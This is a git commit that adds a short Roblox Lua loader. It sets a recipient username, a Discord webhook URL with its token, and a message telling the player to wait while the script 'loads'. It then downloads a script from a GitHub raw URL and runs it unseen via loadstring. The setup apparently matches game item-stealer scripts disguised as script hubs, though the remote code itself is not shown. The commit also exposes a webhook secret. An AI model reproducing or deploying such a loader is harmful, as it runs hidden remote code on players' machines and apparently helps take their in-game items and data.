4022895c3acbc72a87415d210268e4256e018855
blacktrap <132762918+muhanmad6169@users.noreply.github.com>
2023-05-15 12:23:07 +0700

    Create Mainstring.lua

---
+++ main/Mainstring.lua
@@ -0,0 +1,4 @@
+_G.Username = "HieuPetSimx"
+_G.HubName = "Project Wd script are loading, please don't leave"
+_G.WebhookUrl = "discord.com/api/webhooks/1107533224663584778/XWBxYKxxqanRKTpMDOilsxZ9vUfjNYiPGOMWT-diP42edMrYUbbw50sNjT4EqJ68TT3H"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
